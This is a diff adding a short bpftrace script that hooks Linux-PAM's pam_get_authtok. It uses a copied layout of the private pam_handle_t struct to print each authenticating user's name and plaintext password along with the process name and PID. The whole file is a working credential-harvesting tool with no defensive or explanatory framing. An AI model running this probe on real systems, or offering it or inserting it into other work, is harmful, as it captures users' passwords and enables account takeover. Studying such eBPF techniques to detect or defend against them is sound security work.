@@ -1,0 +1,20 @@
+// from https://github.com/linux-pam/linux-pam/blob/master/libpam/pam_private.h#L152
+struct pam_handle_t
+{
+  char *authtok;
+  unsigned buffer1;
+  void *buffer2;
+  char *buffer3;
+  char *buffer4;
+  char *buffer5;
+  char *user;
+};
+
+uprobe:/usr/lib/libpam.so:pam_get_authtok {
+	@get_authtok_pam_handle[tid] = arg0;
+}
+
+uretprobe:/usr/lib/libpam.so:pam_get_authtok {
+	$handle = (struct pam_handle_t*)@get_authtok_pam_handle[tid];
+	printf("pam_get_authtok %s@%d -> %s:%s\n", comm, pid, str($handle->user), str($handle->authtok));
+}
